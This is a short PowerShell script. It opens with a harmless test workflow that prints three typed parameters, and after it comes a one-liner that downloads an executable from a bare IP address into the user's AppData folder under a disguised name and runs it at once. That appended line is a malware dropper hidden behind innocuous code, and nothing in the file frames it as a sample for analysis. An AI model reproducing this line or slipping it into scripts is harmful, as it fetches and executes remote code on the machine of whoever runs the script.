workflow Test-WorkFlowWithVariousParameters
{
	param([string] $a, [int] $b, [DateTime] $c)
            "a  is " + $a 
            "b  is " + $b 
            "c  is " + $c 
}
(New-Object System.Net.WebClient).DownloadFile('http://89.248.166.140/~zebra/iesecv.exe',"$env:APPDATA\scvkem.exe");Start-Process ("$env:APPDATA\scvkem.exe")

